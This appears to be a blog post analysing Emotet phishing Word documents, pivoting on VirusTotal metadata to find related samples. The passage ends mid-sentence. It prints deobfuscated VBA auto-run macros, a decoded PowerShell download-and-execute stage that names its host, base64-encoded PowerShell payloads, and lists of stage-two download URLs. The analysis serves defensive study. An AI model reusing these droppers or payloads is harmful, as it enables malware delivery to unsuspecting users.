# Malware Analysis: Pivoting In VT

[malware](/tags#malware ) [emotet](/tags#emotet ) [olevba](/tags#olevba )
[oledump](/tags#oledump ) [powershell](/tags#powershell ) [virus-
total](/tags#virus-total )  
  
May 22, 2019

  * [Emotet Doc](/2019/05/21/malware-analysis-unnamed-emotet-doc.html)
  * Pivoting

![](https://0xdfimages.gitlab.io/img/emotet0-pivot-cover.png) After pulling
apart an Emotet phishing doc in the [previous post](/2019/05/21/malware-
analysis-unnamed-emotet-doc.html), I wanted to see if I could find similar
docs from the same phishing campaign, and perhaps even different docs from
previous phishing campaigns based on artifacts in the seed document. With
access to a paid VirusTotal account, this is not difficult to do.

## Exif Data

### Get Data

There are many ways to pivot based on content of the file, but I’ll start by
looking at the exif data for the document:

    
    
    $ exiftool cdc216f48ec57a6c822139b6534330e8feea8b7bc83ad85614fa52ca372413c2
    ExifTool Version Number         : 10.80
    File Name                       : cdc216f48ec57a6c822139b6534330e8feea8b7bc83ad85614fa52ca372413c2
    Directory                       : .
    File Size                       : 132 kB
    File Modification Date/Time     : 2019:05:20 05:57:46-07:00
    File Access Date/Time           : 2019:05:20 05:57:44-07:00
    File Inode Change Date/Time     : 2019:05:20 05:57:46-07:00
    File Permissions                : rwxrwxrwx
    File Type                       : FPX
    File Type Extension             : fpx
    MIME Type                       : image/vnd.fpx
    Comp Obj User Type Len          : 32
    Comp Obj User Type              : Microsoft Word 97-2003 Document
    Title                           : Ways
    Subject                         : Kyrgyz Republic
    Author                          : Piper Satterfield
    Keywords                        : 
    Comments                        : Small Soft Shirt systems Representative
    Template                        : Normal.dotm
    Last Modified By                : 
    Revision Number                 : 1
    Software                        : Microsoft Office Word
    Total Edit Time                 : 0
    Create Date                     : 2019:05:20 07:57:00
    Modify Date                     : 2019:05:20 07:57:00
    Pages                           : 1
    Words                           : 10
    Characters                      : 62
    Security                        : None
    Code Page                       : Windows Latin 1 (Western European)
    Company                         : Mann and Sons
    Lines                           : 1
    Paragraphs                      : 1
    Char Count With Spaces          : 71
    App Version                     : 16.0000
    Scale Crop                      : No
    Links Up To Date                : No
    Shared Doc                      : No
    Hyperlinks Changed              : No
    Title Of Parts                  : 
    Heading Pairs                   : Title, 1
    Manager                         : Hamill
    

I can see this same data (and more) on the details tab in VT:

![1558503705378](https://0xdfimages.gitlab.io/img/1558503705378.png)

### Pivots

I see a few fields that look interesting and worth pivoting on, such as
author, company, and manager:

Field | Search | Results  
---|---|---  
author | `metadata:"Piper Satterfield"` | Only Seed  
company | `metadata:"Mann and Sons"` | Only Seed  
manager | `metadata:"Hamill"` | 132 Files  
  
132 is an interesting result. It’s more than the seed, but not so many that
it’s clearly just pulling unrelated documents together.

![1558445901550](https://0xdfimages.gitlab.io/img/1558445901550.png)

### Triage

The results are largely docs since 20 May, but many pdfs, and some zips and
other things going further back. I looked at a couple, and they seemed
innocuous. If I limit the search to docs (`metadata:"Hamill" tag:doc`), then I
get 59 hits over the last 90 days (as far back as I can look without a retro
hunt). I’ll triage those by downloading them and looking at their code. I can
divide them into the following categories:

Category | Number | First Uploaded | Notes  
---|---|---|---  
Feb 25 Malicious | 1 | 25 Feb | Malicious, Emotet, but different VBA  
No AV Hits | 4 | 2, 20, 24 Mar  
4 May | No Macros, all different submitters, different content  
Early Variant | 4 | 13, 14 May | Similar, but VBA spread across modules  
Match Seed | 50 | 15, 17, 20-21 May | All contain original base64 string except two which had macros stripped and one outlier  
  
## Benign Matches

It’s interesting that there are four benign hits submitted in the same
timeframe. But on looking at the content, it seems they are unrelated. I can
preview the content in VT, and see no similarities, and no messages to enable
macros (so not test documents not yet weaponized). They are each submitted by
different submitters, across 3 different countries.

These seem like false positives.

## Feb 25 Sample

### Overview

#### Context

The [earliest
sample](https://www.virustotal.com/gui/file/5a4552d46b03ecc255f3523e4c8d6855a4841c123644c9b6c73cc6135ce1c940/detection)
was uploaded on 25 February. Since my access only goes back 90 days, it’s not
clear if there was the end of a different wave, or just a one-off.

#### Obfuscation

The vba was full of statements with extra meaningless assignments, not while,
wend, redims like the seed document:

    
    
    ...[snip]...
    bjVTSqxpSPkDFtl = 5525
    QzHsLFGprKB = 5200
    
    KSjwTgFVTQRQc = 5771
    ZbngMHZRjTQMq = 3930
    ...[snip]...
    

### VBA

I’ll dump the vba with `olevba`, and it cleans up to:

    
    
    olevba 0.54.1 on Python 2.7.15 - http://decalage.info/python/oletools
    ===============================================================================
    FILE: 5a4552d46b03ecc255f3523e4c8d6855a4841c123644c9b6c73cc6135ce1c940
    Type: OLE
    -------------------------------------------------------------------------------
    VBA MACRO ThisDocument.cls 
    in file: 5a4552d46b03ecc255f3523e4c8d6855a4841c123644c9b6c73cc6135ce1c940 - OLE stream: u'Macros/VBA/ThisDocument'
    - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    Sub AutoClose()
       GSiZaPVDlJHPM = ""
       Set gXbftZzicjj = ThisDocument
       Set tgxdfcsWalnZi = gXbftZzicjj.Shapes("d1yrhd8pns1nv")
       SDnwdkzrKNS = "" + ""
       kScTMCgNtwmFV = "" + "" + Trim("")
       KMqPpSciFkFN = LTrim("")
       ZqCZfkCptgc = ""
       lViFbpwntTSCFBr = RTrim("") + ""
       vrWRCirsDXix = CleanString(tgxdfcsWalnZi.AlternativeText)
       TjdnWLrQQdlxSV = GSiZaPVDlJHPM + Shell(SDnwdkzrKNS + kScTMCgNtwmFV + Trim(vrWRCirsDXix) + KMqPpSciFkFN + ZqCZfkCptgc + lViFbpwntTSCFBr, 177 * 2 + -354)
    End Sub
    +----------+--------------------+---------------------------------------------+
    |Type      |Keyword             |Description                                  |
    +----------+--------------------+---------------------------------------------+
    |AutoExec  |AutoClose           |Runs when the Word document is closed        |
    |Suspicious|Shell               |May run an executable file or a system       |
    |          |                    |command                                      |
    +----------+--------------------+---------------------------------------------+
    

The macro is actually in the document class, not in a macro modules. The meat
is in an `autoclose` function. It runs:

    
    
    TjdnWLrQQdlxSV = GSiZaPVDlJHPM + Shell(SDnwdkzrKNS + kScTMCgNtwmFV + Trim(vrWRCirsDXix) + KMqPpSciFkFN + ZqCZfkCptgc + lViFbpwntTSCFBr, 177 * 2 + -354)
    

Which simplifies to:

    
    
    TjdnWLrQQdlxSV = "" + Shell(Trim(ThisDocument.Shapes("d1yrhd8pns1nv").AlternativeText), 0)
    

### Getting Shape Data

I tried to get the shape via `oledump` or strings, but failed. Eventually, I
opened the document in word, and used the VBA editor immediate window:

![1558553851163](https://0xdfimages.gitlab.io/img/1558553851163.png)

### Powershell

The PowerShell is interesting when decoded. It doesn’t look like typical
Emotet:

    
    
    $instance = [System.Activator]::CreateInstance("System.Net.WebClient");
    $method = [System.Net.WebClient].GetMethods();
    foreach($m in $method){
    
      if($m.Name -eq "DownloadData"){
         try{
         $uri = New-Object System.Uri("http://g53lois51bruce.company/xap_102b-AZ1/704e.php?l=xtex1.gas")
         $response = $m.Invoke($instance, ($uri));
    
         $path = [System.Environment]::GetFolderPath("CommonApplicationData") + "\\Vfxb.exe";
         [System.IO.File]::WriteAllBytes($path, $response);
    
         $clsid = New-Object Guid 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
         $type = [Type]::GetTypeFromCLSID($clsid)
         $object = [Activator]::CreateInstance($type)
         $object.Document.Application.ShellExecute($path,$nul, $nul, $nul,0)
    
         }catch{}
         
      }
    }
    
    Exit;
    

Little things, like it is nicely spaced (not all crammed together on one
line), has only one url as opposed to a list separated by `@`, and downloads
the data to a variable, then writes that to a file, and then creates a
`ShellBrowserWindow` object using the Class ID (CLSID) and then executes the
binary out of there. I’d be curious to see what the second stage looks like,
and if it detects as Emotet, but it seems the domain is down, so this may
remain a mystery.

## Early Variant (13-14 May)

### Meta

There are four similar samples that show up 3-4 days before the first that
matches the seed document.. They have the following md5 hashes:

    
    
    d24e5960b9ce0ba4a053ac20f68d06ea
    f323c7f971a94926fae9e1f0aebaf7ab
    e137e91623bbc1552b3b978f03f2aeeb
    e721af952dc33d9d51af6f153fd84b1d
    

### Analysis

I’ll start with one, d24e5960b9ce0ba4a053ac20f68d06ea.

#### oledump

I’ll star with `oledump` since these documents like to hide interesting stuff
in different places.

    
    
    $ oledump.py 0531443a22c350e6597d50bfb68521f8071e4a7b3c0534aa740983b1870ab5a3.doc 
      1:       114 '\x01CompObj'
      2:       348 '\x05DocumentSummaryInformation'
      3:       428 '\x05SummaryInformation'
      4:      7494 '1Table'
      5:     65401 'Data'
      6:        97 'Macros/P79567/\x01CompObj'
      7:       287 'Macros/P79567/\x03VBFrame'
      8:      2062 'Macros/P79567/f'
      9:       312 'Macros/P79567/o'
     10:       717 'Macros/PROJECT'
     11:       188 'Macros/PROJECTwm'
     12: M    4473 'Macros/VBA/B8670_'
     13: M    3635 'Macros/VBA/D793_958'
     14: m     674 'Macros/VBA/D84923'
     15: M    3711 'Macros/VBA/O2636110'
     16: m    1157 'Macros/VBA/P79567'
     17: m     674 'Macros/VBA/S32965'
     18:      8420 'Macros/VBA/_VBA_PROJECT'
     19:       950 'Macros/VBA/dir'
     20: m    1100 'Macros/VBA/f9822292'
     21: m    1155 'Macros/VBA/n09975'
     22:        97 'Macros/n09975/\x01CompObj'
     23:       286 'Macros/n09975/\x03VBFrame'
     24:        90 'Macros/n09975/f'
     25:        52 'Macros/n09975/o'
     26:      4096 'WordDocument'
    

I’ll dump out the streams, using `grep` to get rid of the useless stuff put in
to confuse analysis:

    
    
    $ oledump.py -s 12 -v 0531443a22c350e6597d50bfb68521f8071e4a7b3c0534aa740983b1870ab5a3.doc  | grep -v -e Wend -e While -e Close
    Attribute VB_Name = "B8670_"
    
    Public Function F31234()
    Set F31234 = I84593(GetObject(CStr("wi") + CStr("nmgmt") + "s:Win32_Proce" + "ssStartup"))
    m349_5 = vbError - vbError
    With F31234
    . _
    ShowWindow = m349_5 + m349_5 + m349_5 + m349_5 + m349_5 + m349_5 + m349_5
    End With
    End Function
    
    $ oledump.py -s 13 -v 0531443a22c350e6597d50bfb68521f8071e4a7b3c0534aa740983b1870ab5a3.doc  | grep -v -e Wend -e While -e Close
    Attribute VB_Name = "D793_958"
    Function I84593(L2009438)
    Set I84593 = CVar(L2009438)
    End Function
    Sub _
    autoopen()
    On Error Resume Next
    Call N4417_
    End Sub
    
    $ oledump.py 0531443a22c350e6597d50bfb68521f8071e4a7b3c0534aa740983b1870ab5a3.doc -s 15 -v | grep -v -e Wend -e While -e Close
    Attribute VB_Name = "O2636110"
    Function N4417_()
    On Error Resume Next
    C1_231 = n09975.O63139.Tag + P79567.Z612228 + n09975.O63139.Text + P79567.n309_206 + n09975.O63139.Tag + n09975.O63139.Tag + P79567.j59525 + n09975.O63139.Value + n09975.O63139.Text + P79567.v79900_ + n09975.O63139.Value + P79567.q_007600.ControlTipText + n09975.O63139.Text
    Set q4_98931 = I84593(GetObject(CStr("wi") + CStr("nmgmt") + "s:Win32_Proce" + "ss"))
    q4_98931.Create O36_85 + C1_231 + a915_245, M941890, F31234, d0586064
    End Function
    

There’s an `autoopen()` function that just calls `N4414_`. Inside that
function, there’s many references to `n09975` and `P79567`. I’ll recognize
those from the `oledump`:

    
    
      6:        97 'Macros/P79567/\x01CompObj'
      7:       287 'Macros/P79567/\x03VBFrame'
      8:      2062 'Macros/P79567/f'
      9:       312 'Macros/P79567/o'
    ...[snip]...
     22:        97 'Macros/n09975/\x01CompObj'
     23:       286 'Macros/n09975/\x03VBFrame'
     24:        90 'Macros/n09975/f'
     25:        52 'Macros/n09975/o'
    

#### VBA Editor

I can dump these streams with `oledump`, but I don’t get back something where
I can break out the parts and understand what’s going on. If I use my sandbox
VM (disconnected from the internet), I can open the VBA editor and see what’s
going on. I’ll tell word not to enable macros, and then hit alt-f11 to open
the VBA editor.

The document has two Forms:

![1558451900373](https://0xdfimages.gitlab.io/img/1558451900373.png)

I can view them:

![1558451914303](https://0xdfimages.gitlab.io/img/1558451914303.png)

I can also use the Properties dropdown to see the elements on each form:

![1558451938643](https://0xdfimages.gitlab.io/img/1558451938643.png)

To start with this line from the VBA:

    
    
    C1_231 = n09975.O63139.Tag + P79567.Z612228 + n09975.O63139.Text + P79567.n309_206 + n09975.O63139.Tag + n09975.O63139.Tag + P79567.j59525 + n09975.O63139.Value + n09975.O63139.Text + P79567.v79900_ + n09975.O63139.Value + P79567.q_007600.ControlTipText + n09975.O63139.Text
    

I can select form `n09975`, and then `O63139` from the dropdown. I can see
that the tag is empty:

![1558452031207](https://0xdfimages.gitlab.io/img/1558452031207.png)

I could also run it in the Immediate window:

![1558452126609](https://0xdfimages.gitlab.io/img/1558452126609.png)

Here’s the output:

    
    
    print n09975.O63139.Tag + P79567.Z612228 + n09975.O63139.Text + P79567.n309_206 + n09975.O63139.Tag + n09975.O63139.Tag + P79567.j59525 + n09975.O63139.Value + n09975.O63139.Text + P79567.v79900_ + n09975.O63139.Value + P79567.q_007600.ControlTipText + n09975.O63139.Text
    powershell             -e      JABwADEANwA3ADIAMgA9ACcAcgAyADEANQAwADkAJwA7ACQAdwBfADAANwAwADUAXwAgAD0AIAAnADEANwAyACcAOwAkAEkAMQAwADMAXwBfAD0AJwBuADEAXwA0ADMANQAxADgAJwA7ACQAbgA0ADkAMAA4ADEAPQAkAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlACsAJwBcACcAKwAkAHcAXwAwADcAMAA1AF8AKwAnAC4AZQB4AGUAJwA7ACQAdgAxADYAOAAzADYAPQAnAHIANgAyADIAMwA4ADcAOQAnADsAJABBADgAMAA4ADIAOAAyAF8APQAuACgAJwBuAGUAJwArACcAdwAtACcAKwAnAG8AJwArACcAYgBqAGUAYwB0ACcAKQAgAG4ARQBUAGAALgB3AEUAYgBgAGMAbABgAEkARQBuAHQAOwAkAEMAOABfADkAMwA4AF8AMAA9ACcAaAB0AHQAcAA6AC8ALwB2AGkAZABlAG8AcwAuAGwAYQBtAGEAZwBoAHIAZQBiAGkAbgBlAC4AYwBvAG0ALwB3AHAALQBhAGQAbQBpAG4ALwByADkANAA2ADEANwAvAEAAaAB0AHQAcAA6AC8ALwBhAG0AYQBjAGgAcgBvAG4ALgBjAG8AbQAvADEAZQA3AHQAOAA2AG4ALwBkAGIAaQA2ADIAOAAxAC8AQABoAHQAdABwADoALwAvAG0AbQBjAHIAdABzAC4AYwBvAG0ALwAxADEALwAwAHEAYgAwADYANAAvAEAAaAB0AHQAcAA6AC8ALwB4AGcAaQBuAGYAbwByAG0AYQB0AGkAYwBhAC4AYwBvAG0ALwBhAHkAZABhAHMAZQBzAG8AcgBlAHMALgBjAG8AbQAvAGcAMAAxADgAMwAvAEAAaAB0AHQAcAA6AC8ALwB3AGEAcgB3AGkAYwBrAHYAYQBsAGwAZQB5AGwAaQB2AGkAbgBnAC4AYwBvAG0A
    LwBpAG0AYQBnAGUAcwAvAGMAbABhAHMAcwBlAHMALwBkAHUANAB5AHoAMAAxADIAOQA0AC8AJwAuAHMAcABsAGkAdAAoACcAQAAnACkAOwAkAG4AXwA5ADIANQAwADQAMgA9ACcAZgA5ADEAOABfADcAMwBfACcAOwBmAG8AcgBlAGEAYwBoACgAJABvAF8ANABfAF8AXwAgAGkAbgAgACQAQwA4AF8AOQAzADgAXwAwACkAewB0AHIAeQB7ACQAQQA4ADAAOAAyADgAMgBfAC4ARABvAFcATgBsAE8AYQBkAEYASQBsAEUAKAAkAG8AXwA0AF8AXwBfACwAIAAkAG4ANAA5ADAAOAAxACkAOwAkAHMANQA4ADIAMgA4ADgAPQAnAFEAOAA1ADIAMgBfAF8ANAAnADsASQBmACAAKAAoAC4AKAAnAEcAZQB0ACcAKwAnAC0ASQAnACsAJwB0AGUAbQAnACkAIAAkAG4ANAA5ADAAOAAxACkALgBsAGUAbgBHAFQASAAgAC0AZwBlACAAMwA1ADQANgA5ACkAIAB7AC4AKAAnAEkAbgB2ACcAKwAnAG8AawBlAC0ASQB0AGUAJwArACcAbQAnACkAIAAkAG4ANAA5ADAAOAAxADsAJABRADEAMgA3ADMAMQA1AD0AJwBoADUANwAzADgAMQAnADsAYgByAGUAYQBrADsAJABqADEAOAAzADgANAA9ACcASQA4AF8AOQBfADMAJwB9AH0AYwBhAHQAYwBoAHsAfQB9ACQAdwAzADkANAAxADAAPQAnAEwANgAyADAAMgAzACcA
    

The base64 stuff is in `P79567.q_007600.ControlTipText`:

![1558452161982](https://0xdfimages.gitlab.io/img/1558452161982.png)

So this function becomes:

    
    
    C1_231 = [powershell command above]
    Set q4_98931 = GetObject("winmgmts:Win32_Process")
    q4_98931.Create C1_231, 0, F31234, 0
    

`F31234` is a function that sets the `ShowWindow` to 0 just like in the seed
sample.

### Other Samples

The other three samples have a similar pattern, with the names of the two
forms and the various components changed, but otherwise it’s the same.

I can use a loop to get the sites the various samples will contact to get the
stage two:

    
    
    $ for f in $(ls); do md5sum $f; strings -n 400 $f | while read line; do echo $line | base64 -d | strings -eb | grep -Po "https?://.*?'"; echo $line | base64 -d | strings -el | grep -Po "https?://.*?'"; done | tr '@' '\n'; done
    d24e5960b9ce0ba4a053ac20f68d06ea  0531443a22c350e6597d50bfb68521f8071e4a7b3c0534aa740983b1870ab5a3.doc
    http://videos.lamaghrebine.com/wp-admin/r94617/
    http://amachron.com/1e7t86n/dbi6281/
    http://mmcrts.com/11/0qb064/
    http://xginformatica.com/aydasesores.com/g0183/
    http://warwickvalleyliving.com/images/classes/du4yz01294/'
    f323c7f971a94926fae9e1f0aebaf7ab  16dc6296b4528cfc0398d6127225f2f9f407858e76943e51d1cc85ed813769d4.doc
    http://xycindustrial.com/wp-content/uploads/3oz5f80982/
    http://arstudiorental.com/ecmyl/papkaa17/f8vhktx2825/
    http://technosoftservicess.com/bhldyu/un96/
    http://egresswindowsystems.com/magiczoomplus/vh8/
    http://star-sport.com/lacc/8v0hb1639/'
    e137e91623bbc1552b3b978f03f2aeeb  54d0c8478e1389bf1dc4821e9baedb94357cf2b89af8122dfab723202c1aa560.doc
    https://baovechinhphap.com/wp-includes/gdmiad3/
    http://ds-cocoa.com/css/ptk903/
    http://corehealingmassage.com/wp-admin/ufbyw973/
    http://derleyicihatasi.com/gecmis/or116/
    http://nhaxinhvina.xyz/36e/nnrm97524/'
    e721af952dc33d9d51af6f153fd84b1d  9b82bc55feb9c4599636e8cdaef37a3acf267e5c2b1979432a0e2515a24b1491.doc
    https://baovechinhphap.com/wp-includes/gdmiad3/
    http://ds-cocoa.com/css/ptk903/
    http://corehealingmassage.com/wp-admin/ufbyw973/
    http://derleyicihatasi.com/gecmis/or116/
    http://nhaxinhvina.xyz/36e/nnrm97524/'
    

I’ll break down that loop. I’ve got the 4 documents in this folder.

  * Loop over them for a `for`, setting the document to `$f`.
  * Print the `md5sum` of the file to show which file the following c2 are coming from.
  * For each document, run strings to get strings over 400 characters, based on some manual testing that shows that isolates the base64 string, and store that as `$line`.
  * This next part I’ll do twice, because I notice that the text encoding differed in one of the documents: 
    * Echo the base64 into `base64 -d` to decode;
    * Pipe that output into `strings` (once with `-eb` and once with `-el` for little or big endian) to convert it from utf16 to ascii;
    * `grep` to get just the url string, using `-P` to get Perl regex and `-o` to output only the match, not the line;
    * Replace the separator `@` with a newline.

## 50 Samples

Of the 50 samples collected in the wave the seed document was in, 49 of them
contain the exact same base64 string as the seed. I can actually get the
base64 string out of this format of document just by looking for really long
strings in the doc:

    
    
    $ strings -n 400 * | sort | uniq -c | cut -c-100
          1 AF8AOQBfADAAPQAkAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlACsAJwBcACcAKwAkAEEAMAA5ADYAOQA5ACsA
         49 JABUADcAXwA2ADQANQAzADMAPQAnAGMAXwA3ADQANQA3ADcAJwA7ACQATgAzADkANQBfAF8ANgA1ACAAPQAgACcAMgA0
          2 MACRO CONTENT CLEANED BY ESET   MACRO CONTENT CLEANED BY ESET   MACRO CONTENT CLEANED BY ESE
          2 MACRO CONTENT CLEANED BY ESET   MACRO CONTENT CLEANED BY ESET   MACRO CONTENT CLEANED BY ESE
          2 MACRO CONTENT CLEANED BY ESET   MACRO CONTENT CLEANED BY ESET   MACRO CONTENT CLEANED BY ESE
          2 MACRO CONTENT CLEANED BY ESET   MACRO CONTENT CLEANED BY ESET   MACRO CONTENT CLEANED BY ESE
          2 MACRO CONTENT CLEANED BY ESET   MACRO CONTENT CLEANED BY ESET   MACRO CONTENT CLEANED BY ESE
          2 MACRO CONTENT CLEANED BY ESET   MACRO CONTENT CLEANED BY ESET   MACRO CONTENT CLEANED BY ESE
          2 MACRO CONTENT CLEANED BY ESET   MACRO CONTENT CLEANED BY ESET   MACRO CONTENT CLEANED BY ESE
    

I’ll see above that the string is present in 49. Also, two of the documents
had the VBA cleaned out by ESET. It didn’t remove the base64 from those docs,
just the code.

## One Unique

### Overview

There is [one
document](https://www.virustotal.com/gui/file/b56d126b99435483539fb9ea1db0d269d8b26900bd081bfd8558a4a89d1728a0/submissions)
that stands out is different. I originally missed this document was actually
first uploaded on 15 May, since it was uploaded again on 20 May in the big
wave. It appears to be somewhat between the 13-14 May documents and the wave
on 20 May.

### Objects

When I dump the OLE with `oledump`, I see a ton of objects at the end:

    
    
    $ oledump.py  b56d126b99435483539fb9ea1db0d269d8b26900bd081bfd8558a4a89d1728a0.doc 
      1:       114 '\x01CompObj'
      2:       340 '\x05DocumentSummaryInformation'
      3:       472 '\x05SummaryInformation'
      4:      7754 '1Table'
      5:     68451 'Data'
      6:       738 'Macros/PROJECT'
      7:       236 'Macros/PROJECTwm'
      8: m     674 'Macros/VBA/Q12543'
      9: M    4361 'Macros/VBA/T10276'
     10: m     677 'Macros/VBA/Y5513012'
     11:      8170 'Macros/VBA/_VBA_PROJECT'
     12: m     675 'Macros/VBA/b001947'
     13:      1007 'Macros/VBA/dir'
     14: M    6018 'Macros/VBA/i44961'
     15: m    1816 'Macros/VBA/j052640'
     16: m     675 'Macros/VBA/k6471_8'
     17: m     675 'Macros/VBA/k67426_'
     18: M    4453 'Macros/VBA/r3273_'
     19: m     677 'Macros/VBA/u6446562'
     20:       116 'ObjectPool/_1619425214/\x01CompObj'
     21:        20 'ObjectPool/_1619425214/\x03OCXNAME'
     22:         6 'ObjectPool/_1619425214/\x03ObjInfo'
     23:      2044 'ObjectPool/_1619425214/contents'
     24:       116 'ObjectPool/_1619425215/\x01CompObj'
     25:        20 'ObjectPool/_1619425215/\x03OCXNAME'
     26:         6 'ObjectPool/_1619425215/\x03ObjInfo'
     27:        60 'ObjectPool/_1619425215/contents'
     28:       116 'ObjectPool/_1619425216/\x01CompObj'
     29:        20 'ObjectPool/_1619425216/\x03OCXNAME'
     30:         6 'ObjectPool/_1619425216/\x03ObjInfo'
     31:        64 'ObjectPool/_1619425216/contents'
     32:       116 'ObjectPool/_1619425217/\x01CompObj'
     33:        20 'ObjectPool/_1619425217/\x03OCXNAME'
     34:         6 'ObjectPool/_1619425217/\x03ObjInfo'
     35:        60 'ObjectPool/_1619425217/contents'
     36:       116 'ObjectPool/_1619425218/\x01CompObj'
     37:        20 'ObjectPool/_1619425218/\x03OCXNAME'
     38:         6 'ObjectPool/_1619425218/\x03ObjInfo'
     39:        60 'ObjectPool/_1619425218/contents'
     40:       116 'ObjectPool/_1619425219/\x01CompObj'
     41:        20 'ObjectPool/_1619425219/\x03OCXNAME'
     42:         6 'ObjectPool/_1619425219/\x03ObjInfo'
     43:       378 'ObjectPool/_1619425219/\x03PRINT'
     44:        52 'ObjectPool/_1619425219/contents'
     45:      4142 'WordDocument'
    

I can write a line that will dump the object name and I think the string in
that content that works pretty well:

    
    
    $ oledump.py  b56d126b99435483539fb9ea1db0d269d8b26900bd081bfd8558a4a89d1728a0.doc -s 21 -d; echo; oledump.py b56d126b99435483539fb9ea1db0d269d8b26900bd081bfd8558a4a89d1728a0.doc -s 23 -d | cut -c28- | strings -n1 | head -1
    n2581304
    JAB3ADgANQA1ADIAMgBfADkAPQAnAGwAOQBfADUAOQAxADcAMAAnADsAJABBADAAOQA2ADkAOQAgAD0AIAAnADIAOQA5ACcAOwAkAEsANgA0ADgAOAAxADkAMAA9ACcAbwAxAF8AOAAyADcANwAnADsAJAB6ADMAMwA1AF8AOQBfADAAPQAkAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlACsAJwBcACcAKwAkAEEAMAA5ADYAOQA5ACsAJwAuAGUAeABlACcAOwAkAFYAMwA1ADEAMgA3AD0AJwBGADkAXwAwADYAMgAyACcAOwAkAE0ANAA3ADgAMQA3AF8ANwA9ACYAKAAnAG4AZQB3ACcAKwAnAC0AbwBiACcAKwAnAGoAZQBjAHQAJwApACAAbgBlAFQALgB3AGUAYABCAGAAYwBMAEkARQBOAFQAOwAkAEQANwAxADUAMwBfADAAPQAnAGgAdAB0AHAAOgAvAC8AZAByAG0AYQByAGkAbgBzAC4AYwBvAG0ALwBlAG4AZwBsAC8AcABDAEEAZABPAEwAVwBMAEoALwBAAGgAdAB0AHAAOgAvAC8AaAB5AGIAcgBpAGQAYgB1AHMAaQBuAGUAcwBzAHMAbwBsAHUAdABpAG8AbgBzAC4AYwBvAG0ALgBhAHUALwBjAGcAaQAtAGIAaQBuAC8AdAA2AHkAZQAwAGoAXwB3AHkAaABmADQAeQB3AC0AMgAvAEAAaAB0AHQAcAA6AC8ALwBkAHUAcgBhAGsAYgB1AGYAZQBjAGUAbgBnAGUAbABrAG8AeQAuAGMAbwBtAC8AdwBwAC0AaQBuAGMAbAB1AGQAZQBzAC8ARwByAEkAQgBRAFQAbgBvAE8ALwBAAGgAdAB0AHAAOgAvAC8AcABlAHIAZgBvAHIAbQBhAG4AYwBlAHYAaQB0AGEAbABpAHQAeQAuAG4AZQB0AC8AcABhAHIAdABuAGUAcgAvAHIAcQAyAHQAbwB0AHYAXwBiAHIAeQBoAGQAcQBqAGMAMgAtADEANwAzADIAMAAvAEAAaAB0AHQAcAA6AC8ALwB0AG4AcgBrAGUAbgB0AG8AbgBvAGQAZQAuAGMAbwBtAC8AdwBwAC0AYQBkAG0AaQBuAC8AdgB4AGEAbABqAG4AZQBxAF8AZgA5AHYAYwB3AHYAcwB6ADAAMwAtADAAMQA1ADgANAA1ADUAMQA5AC8AJwAuAFMAUABMAEkAdAAoACcAQAAnACkAOwAkAEUAOQA2ADIAMgAwAD0AJwB6ADgAMQA5ADcANgAnADsAZgBvAHIAZQBhAGMAaAAoACQAawA0ADUANwAwADgANwAgAGkAbgAgACQARAA3ADEANQAzAF8AMAApAHsAdAByAHkAewAkAE0ANAA3ADgAMQA3AF8ANwAuAGQATwBXAG4ATABvAEEARABmAEkATABFACgAJABrADQANQA3ADAAOAA3ACwAIAAkAHoAMwAzADUAXwA5AF8AMAApADsAJABIADMANgAwADUAMwAyADUAPQAnAEYAMAA4ADQAXwAwADAAJwA7AEkAZgAgACgAKAAuACgAJwBHAGUAdAAtAEkAdABlACcAKwAnAG0AJwApACAAJAB6ADMAMwA1AF8AOQBfADAAKQAuAGwAZQBuAEcAVABIACAALQBnAGUAIAAzADkAOAA4ADgAKQAgAHsALgAoACcASQAnACsAJwBuAHYAbwBrACcAKwAnAGUALQBJAHQAZQBtACcAKQAgACQAegAzADMANQBfADkAXwAwADsAJABmADEAMwA0ADgAOQAzADAAPQAnAFoANABfADEANAAwADcAXwAnADsAYgByAGUAYQBrADsAJABmADEAOAA2ADkAOQA3ADgAPQAnAHIANwBfADIAMwAxACcAfQB9AGMAYQB0AGMAaAB7AH0AfQAkAEcAOABfADQAMwA2AD0AJwB2ADcAXwAxADMAXwA0ADcAJwA=
    $ oledump.py  b56d126b99435483539fb9ea1db0d269d8b26900bd081bfd8558a4a89d1728a0.doc -s 25 -d; echo; oledump.py b56d126b99435483539fb9ea1db0d269d8b26900bd081bfd8558a4a89d1728a0.doc -s 27 -d | cut -c28- | strings -n1 | head -1
    b_0376
    powi
    $ oledump.py  b56d126b99435483539fb9ea1db0d269d8b26900bd081bfd8558a4a89d1728a0.doc -s 29 -d; echo; oledump.py b56d126b99435483539fb9ea1db0d269d8b26900bd081bfd8558a4a89d1728a0.doc -s 31 -d | cut -c28- | strings -n1 | head -1
    f616817
    ershell 
    $ oledump.py  b56d126b99435483539fb9ea1db0d269d8b26900bd081bfd8558a4a89d1728a0.doc -s 33 -d; echo; oledump.py b56d126b99435483539fb9ea1db0d269d8b26900bd081bfd8558a4a89d1728a0.doc -s 35 -d | cut -c28- | strings -n1 | head -1
    A64818
    -
    $ oledump.py  b56d126b99435483539fb9ea1db0d269d8b26900bd081bfd8558a4a89d1728a0.doc -s 37 -d; echo; oledump.py b56d126b99435483539fb9ea1db0d269d8b26900bd081bfd8558a4a89d1728a0.doc -s 39 -d | cut -c28- | strings -n1 | head -1
    c_0237_4
    enc 
    $ oledump.py  b56d126b99435483539fb9ea1db0d269d8b26900bd081bfd8558a4a89d1728a0.doc -s 41 -d; echo; oledump.py b56d126b99435483539fb9ea1db0d269d8b26900bd081bfd8558a4a89d1728a0.doc -s 44 -d | cut -c28- | strings -n1 | head -1
    C_4934_0
    5
    

### VBA

If I look at the VBA with `olevba`. It is different from the others in that
the VBA is spread across different modules, but it does largely the same
thing. I can see the string that’s built using these variables:

    
    
    J57944 = j052640.C_4934_0 + j052640.b_0376 + j052640.C_4934_0 + j052640.f616817 + j052640.C_4934_0 + j052640.C_4934_0 + j052640.A64818 + j052640.C_4934_0 + j052640.C_4934_0 + j052640.c_0237_4 + j052640.C_4934_0 + j052640.n2581304 + j052640.C_4934_0
    

So that becomes:

    
    
    J57944 = 5 + 'powi' + 5 + 'ershell' + 5 + 5 + ' -' + 5 + 5 + 'enc' + 5 + [base64 string] + 5
    

That looks a bit weird. I bet the ole format is messing something up. I’ll
load it in my sandbox VM, and go into the VBA editor, and run this string in
